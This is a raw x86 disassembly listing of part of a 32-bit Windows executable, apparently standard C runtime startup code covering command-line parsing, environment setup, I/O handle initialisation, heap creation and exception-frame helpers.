  423017:	push   esi
  423018:	mov    esi,DWORD PTR ds:0x45d274
  42301e:	test   esi,esi
  423020:	jne    0x423029
  423022:	mov    esi,0x42849b
  423027:	jmp    0x42306e
  423029:	mov    al,BYTE PTR [esi]
  42302b:	cmp    al,0x22
  42302d:	jne    0x423057
  42302f:	inc    esi
  423030:	mov    al,BYTE PTR [esi]
  423032:	cmp    al,0x22
  423034:	je     0x423067
  423036:	test   al,al
  423038:	je     0x423050
  42303a:	movzx  eax,al
  42303d:	push   eax
  42303e:	call   0x423f6b
  423043:	test   eax,eax
  423045:	pop    ecx
  423046:	je     0x423049
  423048:	inc    esi
  423049:	inc    esi
  42304a:	mov    al,BYTE PTR [esi]
  42304c:	cmp    al,0x22
  42304e:	jne    0x423036
  423050:	cmp    BYTE PTR [esi],0x22
  423053:	jne    0x423068
  423055:	jmp    0x423067
  423057:	cmp    al,0x20
  423059:	jbe    0x423068
  42305b:	inc    esi
  42305c:	cmp    BYTE PTR [esi],0x20
  42305f:	ja     0x42305b
  423061:	jmp    0x423068
  423063:	cmp    al,0x20
  423065:	ja     0x42306e
  423067:	inc    esi
  423068:	mov    al,BYTE PTR [esi]
  42306a:	test   al,al
  42306c:	jne    0x423063
  42306e:	mov    eax,esi
  423070:	pop    esi
  423071:	ret    
  423072:	push   ebx
  423073:	xor    ebx,ebx
  423075:	cmp    DWORD PTR ds:0x45d26c,ebx
  42307b:	push   esi
  42307c:	push   edi
  42307d:	jne    0x423084
  42307f:	call   0x42444c
  423084:	mov    esi,DWORD PTR ds:0x45cab4
  42308a:	xor    edi,edi
  42308c:	cmp    esi,ebx
  42308e:	jne    0x4230a2
  423090:	jmp    0x4230c2
  423092:	cmp    al,0x3d
  423094:	je     0x423097
  423096:	inc    edi
  423097:	push   esi
  423098:	call   0x423e70
  42309d:	pop    ecx
  42309e:	lea    esi,[esi+eax*1+0x1]
  4230a2:	mov    al,BYTE PTR [esi]
  4230a4:	cmp    al,bl
  4230a6:	jne    0x423092
  4230a8:	lea    eax,[edi*4+0x4]
  4230af:	push   eax
  4230b0:	call   0x424582
  4230b5:	mov    edi,eax
  4230b7:	cmp    edi,ebx
  4230b9:	pop    ecx
  4230ba:	mov    DWORD PTR ds:0x45cae4,edi
  4230c0:	jne    0x4230c7
  4230c2:	or     eax,0xffffffff
  4230c5:	jmp    0x42311f
  4230c7:	mov    esi,DWORD PTR ds:0x45cab4
  4230cd:	push   ebp
  4230ce:	jmp    0x4230fa
  4230d0:	push   esi
  4230d1:	call   0x423e70
  4230d6:	mov    ebp,eax
  4230d8:	inc    ebp
  4230d9:	cmp    BYTE PTR [esi],0x3d
  4230dc:	pop    ecx
  4230dd:	je     0x4230f8
  4230df:	push   ebp
  4230e0:	call   0x424582
  4230e5:	cmp    eax,ebx
  4230e7:	pop    ecx
  4230e8:	mov    DWORD PTR [edi],eax
  4230ea:	je     0x423123
  4230ec:	push   esi
  4230ed:	push   eax
  4230ee:	call   0x423c40
  4230f3:	pop    ecx
  4230f4:	pop    ecx
  4230f5:	add    edi,0x4
  4230f8:	add    esi,ebp
  4230fa:	cmp    BYTE PTR [esi],bl
  4230fc:	jne    0x4230d0
  4230fe:	push   DWORD PTR ds:0x45cab4
  423104:	call   0x42446a
  423109:	mov    DWORD PTR ds:0x45cab4,ebx
  42310f:	mov    DWORD PTR [edi],ebx
  423111:	mov    DWORD PTR ds:0x45d260,0x1
  42311b:	xor    eax,eax
  42311d:	pop    ecx
  42311e:	pop    ebp
  42311f:	pop    edi
  423120:	pop    esi
  423121:	pop    ebx
  423122:	ret    
  423123:	push   DWORD PTR ds:0x45cae4
  423129:	call   0x42446a
  42312e:	mov    DWORD PTR ds:0x45cae4,ebx
  423134:	or     eax,0xffffffff
  423137:	jmp    0x42311d
  423139:	push   ebp
  42313a:	mov    ebp,esp
  42313c:	push   ecx
  42313d:	push   ebx
  42313e:	mov    ebx,DWORD PTR [ebp+0xc]
  423141:	xor    edx,edx
  423143:	cmp    DWORD PTR [ebp+0x8],edx
  423146:	push   edi
  423147:	mov    DWORD PTR [esi],edx
  423149:	mov    edi,ecx
  42314b:	mov    DWORD PTR [ebx],0x1
  423151:	je     0x42315c
  423153:	mov    ecx,DWORD PTR [ebp+0x8]
  423156:	add    DWORD PTR [ebp+0x8],0x4
  42315a:	mov    DWORD PTR [ecx],edi
  42315c:	cmp    BYTE PTR [eax],0x22
  42315f:	jne    0x42316f
  423161:	xor    ecx,ecx
  423163:	test   edx,edx
  423165:	sete   cl
  423168:	inc    eax
  423169:	mov    edx,ecx
  42316b:	mov    cl,0x22
  42316d:	jmp    0x42319c
  42316f:	inc    DWORD PTR [esi]
  423171:	test   edi,edi
  423173:	je     0x42317a
  423175:	mov    cl,BYTE PTR [eax]
  423177:	mov    BYTE PTR [edi],cl
  423179:	inc    edi
  42317a:	mov    cl,BYTE PTR [eax]
  42317c:	movzx  ebx,cl
  42317f:	inc    eax
  423180:	test   BYTE PTR [ebx+0x45cf21],0x4
  423187:	je     0x423195
  423189:	inc    DWORD PTR [esi]
  42318b:	test   edi,edi
  42318d:	je     0x423194
  42318f:	mov    bl,BYTE PTR [eax]
  423191:	mov    BYTE PTR [edi],bl
  423193:	inc    edi
  423194:	inc    eax
  423195:	test   cl,cl
  423197:	mov    ebx,DWORD PTR [ebp+0xc]
  42319a:	je     0x4231ce
  42319c:	test   edx,edx
  42319e:	jne    0x42315c
  4231a0:	cmp    cl,0x20
  4231a3:	je     0x4231aa
  4231a5:	cmp    cl,0x9
  4231a8:	jne    0x42315c
  4231aa:	test   edi,edi
  4231ac:	je     0x4231b2
  4231ae:	and    BYTE PTR [edi-0x1],0x0
  4231b2:	and    DWORD PTR [ebp-0x4],0x0
  4231b6:	cmp    BYTE PTR [eax],0x0
  4231b9:	je     0x423295
  4231bf:	mov    cl,BYTE PTR [eax]
  4231c1:	cmp    cl,0x20
  4231c4:	je     0x4231cb
  4231c6:	cmp    cl,0x9
  4231c9:	jne    0x4231d1
  4231cb:	inc    eax
  4231cc:	jmp    0x4231bf
  4231ce:	dec    eax
  4231cf:	jmp    0x4231b2
  4231d1:	cmp    BYTE PTR [eax],0x0
  4231d4:	je     0x423295
  4231da:	cmp    DWORD PTR [ebp+0x8],0x0
  4231de:	je     0x4231e9
  4231e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4231e3:	add    DWORD PTR [ebp+0x8],0x4
  4231e7:	mov    DWORD PTR [ecx],edi
  4231e9:	inc    DWORD PTR [ebx]
  4231eb:	xor    ebx,ebx
  4231ed:	inc    ebx
  4231ee:	xor    edx,edx
  4231f0:	jmp    0x4231f4
  4231f2:	inc    eax
  4231f3:	inc    edx
  4231f4:	cmp    BYTE PTR [eax],0x5c
  4231f7:	je     0x4231f2
  4231f9:	cmp    BYTE PTR [eax],0x22
  4231fc:	jne    0x423224
  4231fe:	test   dl,0x1
  423201:	jne    0x423222
  423203:	cmp    DWORD PTR [ebp-0x4],0x0
  423207:	je     0x423215
  423209:	lea    ecx,[eax+0x1]
  42320c:	cmp    BYTE PTR [ecx],0x22
  42320f:	jne    0x423215
  423211:	mov    eax,ecx
  423213:	jmp    0x423217
  423215:	xor    ebx,ebx
  423217:	xor    ecx,ecx
  423219:	cmp    DWORD PTR [ebp-0x4],ecx
  42321c:	sete   cl
  42321f:	mov    DWORD PTR [ebp-0x4],ecx
  423222:	shr    edx,1
  423224:	test   edx,edx
  423226:	je     0x423235
  423228:	test   edi,edi
  42322a:	je     0x423230
  42322c:	mov    BYTE PTR [edi],0x5c
  42322f:	inc    edi
  423230:	inc    DWORD PTR [esi]
  423232:	dec    edx
  423233:	jne    0x423228
  423235:	mov    cl,BYTE PTR [eax]
  423237:	test   cl,cl
  423239:	je     0x423283
  42323b:	cmp    DWORD PTR [ebp-0x4],0x0
  42323f:	jne    0x42324b
  423241:	cmp    cl,0x20
  423244:	je     0x423283
  423246:	cmp    cl,0x9
  423249:	je     0x423283
  42324b:	test   ebx,ebx
  42324d:	je     0x42327d
  42324f:	test   edi,edi
  423251:	je     0x42326c
  423253:	movzx  edx,cl
  423256:	test   BYTE PTR [edx+0x45cf21],0x4
  42325d:	je     0x423265
  42325f:	mov    BYTE PTR [edi],cl
  423261:	inc    edi
  423262:	inc    eax
  423263:	inc    DWORD PTR [esi]
  423265:	mov    cl,BYTE PTR [eax]
  423267:	mov    BYTE PTR [edi],cl
  423269:	inc    edi
  42326a:	jmp    0x42327b
  42326c:	movzx  ecx,cl
  42326f:	test   BYTE PTR [ecx+0x45cf21],0x4
  423276:	je     0x42327b
  423278:	inc    eax
  423279:	inc    DWORD PTR [esi]
  42327b:	inc    DWORD PTR [esi]
  42327d:	inc    eax
  42327e:	jmp    0x4231eb
  423283:	test   edi,edi
  423285:	je     0x42328b
  423287:	and    BYTE PTR [edi],0x0
  42328a:	inc    edi
  42328b:	inc    DWORD PTR [esi]
  42328d:	mov    ebx,DWORD PTR [ebp+0xc]
  423290:	jmp    0x4231b6
  423295:	mov    eax,DWORD PTR [ebp+0x8]
  423298:	test   eax,eax
  42329a:	je     0x42329f
  42329c:	and    DWORD PTR [eax],0x0
  42329f:	inc    DWORD PTR [ebx]
  4232a1:	pop    edi
  4232a2:	pop    ebx
  4232a3:	leave  
  4232a4:	ret    
  4232a5:	push   ebp
  4232a6:	mov    ebp,esp
  4232a8:	push   ecx
  4232a9:	push   ecx
  4232aa:	push   ebx
  4232ab:	push   esi
  4232ac:	push   edi
  4232ad:	xor    edi,edi
  4232af:	cmp    DWORD PTR ds:0x45d26c,edi
  4232b5:	jne    0x4232bc
  4232b7:	call   0x42444c
  4232bc:	and    BYTE PTR ds:0x45cc14,0x0
  4232c3:	push   0x104
  4232c8:	mov    esi,0x45cb10
  4232cd:	push   esi
  4232ce:	push   edi
  4232cf:	call   DWORD PTR ds:0x42803c
  4232d5:	mov    eax,ds:0x45d274
  4232da:	cmp    eax,edi
  4232dc:	mov    DWORD PTR ds:0x45caf4,esi
  4232e2:	je     0x4232eb
  4232e4:	cmp    BYTE PTR [eax],0x0
  4232e7:	mov    ebx,eax
  4232e9:	jne    0x4232ed
  4232eb:	mov    ebx,esi
  4232ed:	lea    eax,[ebp-0x4]
  4232f0:	push   eax
  4232f1:	push   edi
  4232f2:	lea    esi,[ebp-0x8]
  4232f5:	xor    ecx,ecx
  4232f7:	mov    eax,ebx
  4232f9:	call   0x423139
  4232fe:	mov    esi,DWORD PTR [ebp-0x4]
  423301:	mov    eax,DWORD PTR [ebp-0x8]
  423304:	shl    esi,0x2
  423307:	add    eax,esi
  423309:	push   eax
  42330a:	call   0x424582
  42330f:	mov    edi,eax
  423311:	add    esp,0xc
  423314:	test   edi,edi
  423316:	jne    0x42331d
  423318:	or     eax,0xffffffff
  42331b:	jmp    0x423342
  42331d:	lea    eax,[ebp-0x4]
  423320:	push   eax
  423321:	lea    ecx,[esi+edi*1]
  423324:	push   edi
  423325:	lea    esi,[ebp-0x8]
  423328:	mov    eax,ebx
  42332a:	call   0x423139
  42332f:	mov    eax,DWORD PTR [ebp-0x4]
  423332:	dec    eax
  423333:	pop    ecx
  423334:	mov    ds:0x45cad8,eax
  423339:	pop    ecx
  42333a:	mov    DWORD PTR ds:0x45cadc,edi
  423340:	xor    eax,eax
  423342:	pop    edi
  423343:	pop    esi
  423344:	pop    ebx
  423345:	leave  
  423346:	ret    
  423347:	push   ecx
  423348:	push   ecx
  423349:	mov    eax,ds:0x45cc18
  42334e:	push   ebx
  42334f:	push   ebp
  423350:	push   esi
  423351:	push   edi
  423352:	mov    edi,DWORD PTR ds:0x428054
  423358:	xor    ebx,ebx
  42335a:	xor    esi,esi
  42335c:	cmp    eax,ebx
  42335e:	push   0x2
  423360:	pop    ebp
  423361:	jne    0x423390
  423363:	call   edi
  423365:	mov    esi,eax
  423367:	cmp    esi,ebx
  423369:	je     0x423377
  42336b:	mov    DWORD PTR ds:0x45cc18,0x1
  423375:	jmp    0x423395
  423377:	call   DWORD PTR ds:0x428010
  42337d:	cmp    eax,0x78
  423380:	jne    0x42338b
  423382:	mov    eax,ebp
  423384:	mov    ds:0x45cc18,eax
  423389:	jmp    0x423390
  42338b:	mov    eax,ds:0x45cc18
  423390:	cmp    eax,0x1
  423393:	jne    0x423412
  423395:	cmp    esi,ebx
  423397:	jne    0x4233a1
  423399:	call   edi
  42339b:	mov    esi,eax
  42339d:	cmp    esi,ebx
  42339f:	je     0x42341a
  4233a1:	cmp    WORD PTR [esi],bx
  4233a4:	mov    eax,esi
  4233a6:	je     0x4233b6
  4233a8:	add    eax,ebp
  4233aa:	cmp    WORD PTR [eax],bx
  4233ad:	jne    0x4233a8
  4233af:	add    eax,ebp
  4233b1:	cmp    WORD PTR [eax],bx
  4233b4:	jne    0x4233a8
  4233b6:	mov    edi,DWORD PTR ds:0x428050
  4233bc:	push   ebx
  4233bd:	push   ebx
  4233be:	push   ebx
  4233bf:	sub    eax,esi
  4233c1:	push   ebx
  4233c2:	sar    eax,1
  4233c4:	inc    eax
  4233c5:	push   eax
  4233c6:	push   esi
  4233c7:	push   ebx
  4233c8:	push   ebx
  4233c9:	mov    DWORD PTR [esp+0x34],eax
  4233cd:	call   edi
  4233cf:	mov    ebp,eax
  4233d1:	cmp    ebp,ebx
  4233d3:	je     0x423407
  4233d5:	push   ebp
  4233d6:	call   0x424582
  4233db:	cmp    eax,ebx
  4233dd:	pop    ecx
  4233de:	mov    DWORD PTR [esp+0x10],eax
  4233e2:	je     0x423407
  4233e4:	push   ebx
  4233e5:	push   ebx
  4233e6:	push   ebp
  4233e7:	push   eax
  4233e8:	push   DWORD PTR [esp+0x24]
  4233ec:	push   esi
  4233ed:	push   ebx
  4233ee:	push   ebx
  4233ef:	call   edi
  4233f1:	test   eax,eax
  4233f3:	jne    0x423403
  4233f5:	push   DWORD PTR [esp+0x10]
  4233f9:	call   0x42446a
  4233fe:	pop    ecx
  4233ff:	mov    DWORD PTR [esp+0x10],ebx
  423403:	mov    ebx,DWORD PTR [esp+0x10]
  423407:	push   esi
  423408:	call   DWORD PTR ds:0x42804c
  42340e:	mov    eax,ebx
  423410:	jmp    0x423462
  423412:	cmp    eax,ebp
  423414:	je     0x42341e
  423416:	cmp    eax,ebx
  423418:	je     0x42341e
  42341a:	xor    eax,eax
  42341c:	jmp    0x423462
  42341e:	call   DWORD PTR ds:0x428048
  423424:	mov    esi,eax
  423426:	cmp    esi,ebx
  423428:	je     0x42341a
  42342a:	cmp    BYTE PTR [esi],bl
  42342c:	je     0x423438
  42342e:	inc    eax
  42342f:	cmp    BYTE PTR [eax],bl
  423431:	jne    0x42342e
  423433:	inc    eax
  423434:	cmp    BYTE PTR [eax],bl
  423436:	jne    0x42342e
  423438:	sub    eax,esi
  42343a:	inc    eax
  42343b:	mov    ebp,eax
  42343d:	push   ebp
  42343e:	call   0x424582
  423443:	mov    edi,eax
  423445:	cmp    edi,ebx
  423447:	pop    ecx
  423448:	jne    0x42344e
  42344a:	xor    edi,edi
  42344c:	jmp    0x423459
  42344e:	push   ebp
  42344f:	push   esi
  423450:	push   edi
  423451:	call   0x4245a0
  423456:	add    esp,0xc
  423459:	push   esi
  42345a:	call   DWORD PTR ds:0x428044
  423460:	mov    eax,edi
  423462:	pop    edi
  423463:	pop    esi
  423464:	pop    ebp
  423465:	pop    ebx
  423466:	pop    ecx
  423467:	pop    ecx
  423468:	ret    
  423469:	sub    esp,0x48
  42346c:	push   ebx
  42346d:	mov    ebx,0x480
  423472:	push   ebx
  423473:	call   0x424582
  423478:	test   eax,eax
  42347a:	pop    ecx
  42347b:	jne    0x423485
  42347d:	or     eax,0xffffffff
  423480:	jmp    0x423662
  423485:	mov    ds:0x45d160,eax
  42348a:	mov    DWORD PTR ds:0x45d148,0x20
  423494:	lea    ecx,[eax+0x480]
  42349a:	jmp    0x4234ba
  42349c:	and    BYTE PTR [eax+0x4],0x0
  4234a0:	or     DWORD PTR [eax],0xffffffff
  4234a3:	and    DWORD PTR [eax+0x8],0x0
  4234a7:	mov    BYTE PTR [eax+0x5],0xa
  4234ab:	mov    ecx,DWORD PTR ds:0x45d160
  4234b1:	add    eax,0x24
  4234b4:	add    ecx,0x480
  4234ba:	cmp    eax,ecx
  4234bc:	jb     0x42349c
  4234be:	push   ebp
  4234bf:	push   esi
  4234c0:	push   edi
  4234c1:	lea    eax,[esp+0x14]
  4234c5:	push   eax
  4234c6:	call   DWORD PTR ds:0x42801c
  4234cc:	cmp    WORD PTR [esp+0x46],0x0
  4234d2:	je     0x4235c1
  4234d8:	mov    eax,DWORD PTR [esp+0x48]
  4234dc:	test   eax,eax
  4234de:	je     0x4235c1
  4234e4:	mov    edi,DWORD PTR [eax]
  4234e6:	lea    ebp,[eax+0x4]
  4234e9:	lea    eax,[edi+ebp*1]
  4234ec:	mov    DWORD PTR [esp+0x10],eax
  4234f0:	mov    eax,0x800
  4234f5:	cmp    edi,eax
  4234f7:	jl     0x4234fb
  4234f9:	mov    edi,eax
  4234fb:	cmp    DWORD PTR ds:0x45d148,edi
  423501:	jge    0x423551
  423503:	mov    esi,0x45d164
  423508:	push   ebx
  423509:	call   0x424582
  42350e:	test   eax,eax
  423510:	pop    ecx
  423511:	je     0x42354b
  423513:	add    DWORD PTR ds:0x45d148,0x20
  42351a:	mov    DWORD PTR [esi],eax
  42351c:	lea    ecx,[eax+0x480]
  423522:	jmp    0x42353a
  423524:	and    BYTE PTR [eax+0x4],0x0
  423528:	or     DWORD PTR [eax],0xffffffff
  42352b:	and    DWORD PTR [eax+0x8],0x0
  42352f:	mov    BYTE PTR [eax+0x5],0xa
  423533:	mov    ecx,DWORD PTR [esi]
  423535:	add    eax,0x24
  423538:	add    ecx,ebx
  42353a:	cmp    eax,ecx
  42353c:	jb     0x423524
  42353e:	add    esi,0x4
  423541:	cmp    DWORD PTR ds:0x45d148,edi
  423547:	jl     0x423508
  423549:	jmp    0x423551
  42354b:	mov    edi,DWORD PTR ds:0x45d148
  423551:	xor    ebx,ebx
  423553:	test   edi,edi
  423555:	jle    0x4235c1
  423557:	mov    eax,DWORD PTR [esp+0x10]
  42355b:	mov    eax,DWORD PTR [eax]
  42355d:	cmp    eax,0xffffffff
  423560:	je     0x4235b6
  423562:	mov    cl,BYTE PTR [ebp+0x0]
  423565:	test   cl,0x1
  423568:	je     0x4235b6
  42356a:	test   cl,0x8
  42356d:	jne    0x42357a
  42356f:	push   eax
  423570:	call   DWORD PTR ds:0x42805c
  423576:	test   eax,eax
  423578:	je     0x4235b6
  42357a:	mov    ecx,ebx
  42357c:	mov    eax,ebx
  42357e:	and    eax,0x1f
  423581:	lea    eax,[eax+eax*8]
  423584:	sar    ecx,0x5
  423587:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  42358e:	lea    esi,[ecx+eax*4]
  423591:	mov    eax,DWORD PTR [esp+0x10]
  423595:	mov    eax,DWORD PTR [eax]
  423597:	mov    DWORD PTR [esi],eax
  423599:	mov    al,BYTE PTR [ebp+0x0]
  42359c:	mov    BYTE PTR [esi+0x4],al
  42359f:	lea    eax,[esi+0xc]
  4235a2:	push   0xfa0
  4235a7:	push   eax
  4235a8:	call   0x4248ed
  4235ad:	test   eax,eax
  4235af:	pop    ecx
  4235b0:	pop    ecx
  4235b1:	je     0x4235e1
  4235b3:	inc    DWORD PTR [esi+0x8]
  4235b6:	add    DWORD PTR [esp+0x10],0x4
  4235bb:	inc    ebx
  4235bc:	inc    ebp
  4235bd:	cmp    ebx,edi
  4235bf:	jl     0x423557
  4235c1:	xor    ebx,ebx
  4235c3:	mov    ecx,DWORD PTR ds:0x45d160
  4235c9:	lea    eax,[ebx+ebx*8]
  4235cc:	lea    esi,[ecx+eax*4]
  4235cf:	cmp    DWORD PTR [esi],0xffffffff
  4235d2:	jne    0x423643
  4235d4:	test   ebx,ebx
  4235d6:	mov    BYTE PTR [esi+0x4],0x81
  4235da:	jne    0x4235e6
  4235dc:	push   0xfffffff6
  4235de:	pop    eax
  4235df:	jmp    0x4235f0
  4235e1:	or     eax,0xffffffff
  4235e4:	jmp    0x42365f
  4235e6:	mov    eax,ebx
  4235e8:	dec    eax
  4235e9:	neg    eax
  4235eb:	sbb    eax,eax
  4235ed:	add    eax,0xfffffff5
  4235f0:	push   eax
  4235f1:	call   DWORD PTR ds:0x428038
  4235f7:	mov    edi,eax
  4235f9:	cmp    edi,0xffffffff
  4235fc:	je     0x42363d
  4235fe:	push   edi
  4235ff:	call   DWORD PTR ds:0x42805c
  423605:	test   eax,eax
  423607:	je     0x42363d
  423609:	and    eax,0xff
  42360e:	cmp    eax,0x2
  423611:	mov    DWORD PTR [esi],edi
  423613:	jne    0x42361b
  423615:	or     BYTE PTR [esi+0x4],0x40
  423619:	jmp    0x423624
  42361b:	cmp    eax,0x3
  42361e:	jne    0x423624
  423620:	or     BYTE PTR [esi+0x4],0x8
  423624:	lea    eax,[esi+0xc]
  423627:	push   0xfa0
  42362c:	push   eax
  42362d:	call   0x4248ed
  423632:	test   eax,eax
  423634:	pop    ecx
  423635:	pop    ecx
  423636:	je     0x4235e1
  423638:	inc    DWORD PTR [esi+0x8]
  42363b:	jmp    0x423647
  42363d:	or     BYTE PTR [esi+0x4],0x40
  423641:	jmp    0x423647
  423643:	or     BYTE PTR [esi+0x4],0x80
  423647:	inc    ebx
  423648:	cmp    ebx,0x3
  42364b:	jl     0x4235c3
  423651:	push   DWORD PTR ds:0x45d148
  423657:	call   DWORD PTR ds:0x428058
  42365d:	xor    eax,eax
  42365f:	pop    edi
  423660:	pop    esi
  423661:	pop    ebp
  423662:	pop    ebx
  423663:	add    esp,0x48
  423666:	ret    
  423667:	push   0xc
  423669:	push   0x4284a0
  42366e:	call   0x423858
  423673:	mov    DWORD PTR [ebp-0x1c],0x428ef8
  42367a:	cmp    DWORD PTR [ebp-0x1c],0x428ef8
  423681:	jae    0x4236a5
  423683:	and    DWORD PTR [ebp-0x4],0x0
  423687:	mov    eax,DWORD PTR [ebp-0x1c]
  42368a:	mov    eax,DWORD PTR [eax]
  42368c:	test   eax,eax
  42368e:	je     0x42369b
  423690:	call   eax
  423692:	jmp    0x42369b
  423694:	xor    eax,eax
  423696:	inc    eax
  423697:	ret    
  423698:	mov    esp,DWORD PTR [ebp-0x18]
  42369b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42369f:	add    DWORD PTR [ebp-0x1c],0x4
  4236a3:	jmp    0x42367a
  4236a5:	call   0x423893
  4236aa:	ret    
  4236ab:	push   0xc
  4236ad:	push   0x4284b0
  4236b2:	call   0x423858
  4236b7:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236be:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236c5:	jae    0x4236e9
  4236c7:	and    DWORD PTR [ebp-0x4],0x0
  4236cb:	mov    eax,DWORD PTR [ebp-0x1c]
  4236ce:	mov    eax,DWORD PTR [eax]
  4236d0:	test   eax,eax
  4236d2:	je     0x4236df
  4236d4:	call   eax
  4236d6:	jmp    0x4236df
  4236d8:	xor    eax,eax
  4236da:	inc    eax
  4236db:	ret    
  4236dc:	mov    esp,DWORD PTR [ebp-0x18]
  4236df:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236e3:	add    DWORD PTR [ebp-0x1c],0x4
  4236e7:	jmp    0x4236be
  4236e9:	call   0x423893
  4236ee:	ret    
  4236ef:	call   0x423936
  4236f4:	mov    eax,ds:0x45c304
  4236f9:	cmp    eax,0xffffffff
  4236fc:	je     0x42370c
  4236fe:	push   eax
  4236ff:	call   DWORD PTR ds:0x428064
  423705:	or     DWORD PTR ds:0x45c304,0xffffffff
  42370c:	ret    
  42370d:	push   ebx
  42370e:	push   esi
  42370f:	call   DWORD PTR ds:0x428010
  423715:	push   DWORD PTR ds:0x45c304
  42371b:	mov    ebx,eax
  42371d:	call   DWORD PTR ds:0x428074
  423723:	mov    esi,eax
  423725:	test   esi,esi
  423727:	jne    0x423772
  423729:	push   0x88
  42372e:	push   0x1
  423730:	call   0x424978
  423735:	mov    esi,eax
  423737:	test   esi,esi
  423739:	pop    ecx
  42373a:	pop    ecx
  42373b:	je     0x42376a
  42373d:	push   esi
  42373e:	push   DWORD PTR ds:0x45c304
  423744:	call   DWORD PTR ds:0x428070
  42374a:	test   eax,eax
  42374c:	je     0x42376a
  42374e:	mov    DWORD PTR [esi+0x54],0x45c258
  423755:	mov    DWORD PTR [esi+0x14],0x1
  42375c:	call   DWORD PTR ds:0x42806c
  423762:	or     DWORD PTR [esi+0x4],0xffffffff
  423766:	mov    DWORD PTR [esi],eax
  423768:	jmp    0x423772
  42376a:	push   0x10
  42376c:	call   0x422920
  423771:	pop    ecx
  423772:	push   ebx
  423773:	call   DWORD PTR ds:0x428068
  423779:	mov    eax,esi
  42377b:	pop    esi
  42377c:	pop    ebx
  42377d:	ret    
  42377e:	call   0x4238ed
  423783:	test   eax,eax
  423785:	je     0x423797
  423787:	call   DWORD PTR ds:0x428078
  42378d:	cmp    eax,0xffffffff
  423790:	mov    ds:0x45c304,eax
  423795:	jne    0x42379f
  423797:	call   0x4236ef
  42379c:	xor    eax,eax
  42379e:	ret    
  42379f:	push   esi
  4237a0:	push   0x88
  4237a5:	push   0x1
  4237a7:	call   0x424978
  4237ac:	mov    esi,eax
  4237ae:	test   esi,esi
  4237b0:	pop    ecx
  4237b1:	pop    ecx
  4237b2:	je     0x4237e4
  4237b4:	push   esi
  4237b5:	push   DWORD PTR ds:0x45c304
  4237bb:	call   DWORD PTR ds:0x428070
  4237c1:	test   eax,eax
  4237c3:	je     0x4237e4
  4237c5:	mov    DWORD PTR [esi+0x54],0x45c258
  4237cc:	mov    DWORD PTR [esi+0x14],0x1
  4237d3:	call   DWORD PTR ds:0x42806c
  4237d9:	or     DWORD PTR [esi+0x4],0xffffffff
  4237dd:	mov    DWORD PTR [esi],eax
  4237df:	xor    eax,eax
  4237e1:	inc    eax
  4237e2:	pop    esi
  4237e3:	ret    
  4237e4:	call   0x4236ef
  4237e9:	xor    eax,eax
  4237eb:	pop    esi
  4237ec:	ret    
  4237ed:	cmp    DWORD PTR ds:0x45cac4,0x2
  4237f4:	jne    0x423803
  4237f6:	cmp    DWORD PTR ds:0x45cad0,0x5
  4237fd:	jb     0x423803
  4237ff:	xor    eax,eax
  423801:	inc    eax
  423802:	ret    
  423803:	push   0x3
  423805:	pop    eax
  423806:	ret    
  423807:	xor    eax,eax
  423809:	cmp    DWORD PTR [esp+0x4],eax
  42380d:	push   0x0
  42380f:	sete   al
  423812:	push   0x1000
  423817:	push   eax
  423818:	call   DWORD PTR ds:0x428080
  42381e:	test   eax,eax
  423820:	mov    ds:0x45d140,eax
  423825:	je     0x423851
  423827:	call   0x4237ed
  42382c:	cmp    eax,0x3
  42382f:	mov    ds:0x45d144,eax
  423834:	jne    0x423854
  423836:	push   0x3f8
  42383b:	call   0x424bfa
  423840:	test   eax,eax
  423842:	pop    ecx
  423843:	jne    0x423854
  423845:	push   DWORD PTR ds:0x45d140
  42384b:	call   DWORD PTR ds:0x42807c
  423851:	xor    eax,eax
  423853:	ret    
  423854:	xor    eax,eax
  423856:	inc    eax
  423857:	ret    
  423858:	push   0x425728
  42385d:	mov    eax,fs:0x0
  423863:	push   eax
  423864:	mov    eax,DWORD PTR [esp+0x10]
  423868:	mov    DWORD PTR [esp+0x10],ebp
  42386c:	lea    ebp,[esp+0x10]
  423870:	sub    esp,eax
  423872:	push   ebx
  423873:	push   esi
  423874:	push   edi
  423875:	mov    eax,DWORD PTR [ebp-0x8]
  423878:	mov    DWORD PTR [ebp-0x18],esp
  42387b:	push   eax
  42387c:	mov    eax,DWORD PTR [ebp-0x4]
  42387f:	mov    DWORD PTR [ebp-0x4],0xffffffff
  423886:	mov    DWORD PTR [ebp-0x8],eax
  423889:	lea    eax,[ebp-0x10]
  42388c:	mov    fs:0x0,eax
  423892:	ret    
  423893:	mov    ecx,DWORD PTR [ebp-0x10]
  423896:	mov    DWORD PTR fs:0x0,ecx
  42389d:	pop    ecx
  42389e:	pop    edi
  42389f:	pop    esi
  4238a0:	pop    ebx
  4238a1:	leave  
  4238a2:	push   ecx
  4238a3:	ret    
  4238a4:	int3   
  4238a5:	int3   
  4238a6:	int3   
  4238a7:	int3   
  4238a8:	int3   
  4238a9:	int3   
  4238aa:	int3   
  4238ab:	int3   
  4238ac:	int3   
  4238ad:	int3   
  4238ae:	int3   
  4238af:	int3   
  4238b0:	cmp    eax,0x1000
  4238b5:	jae    0x4238c5
  4238b7:	neg    eax
  4238b9:	add    eax,esp
  4238bb:	add    eax,0x4
  4238be:	test   DWORD PTR [eax],eax
  4238c0:	xchg   esp,eax
  4238c1:	mov    eax,DWORD PTR [eax]
  4238c3:	push   eax
  4238c4:	ret    
  4238c5:	push   ecx
  4238c6:	lea    ecx,[esp+0x8]
  4238ca:	sub    ecx,0x1000
  4238d0:	sub    eax,0x1000
  4238d5:	test   DWORD PTR [ecx],eax
  4238d7:	cmp    eax,0x1000
  4238dc:	jae    0x4238ca
  4238de:	sub    ecx,eax
  4238e0:	mov    eax,esp
  4238e2:	test   DWORD PTR [ecx],eax
  4238e4:	mov    esp,ecx
  4238e6:	mov    ecx,DWORD PTR [eax]
  4238e8:	mov    eax,DWORD PTR [eax+0x4]
  4238eb:	push   eax
  4238ec:	ret    
  4238ed:	push   esi
  4238ee:	push   edi
  4238ef:	xor    esi,esi
  4238f1:	mov    edi,0x45cc20
  4238f6:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  4238fe:	jne    0x42391e
  423900:	lea    eax,[esi*8+0x45c310]
  423907:	mov    DWORD PTR [eax],edi
  423909:	push   0xfa0
  42390e:	push   DWORD PTR [eax]
  423910:	add    edi,0x18
  423913:	call   0x4248ed
  423918:	test   eax,eax
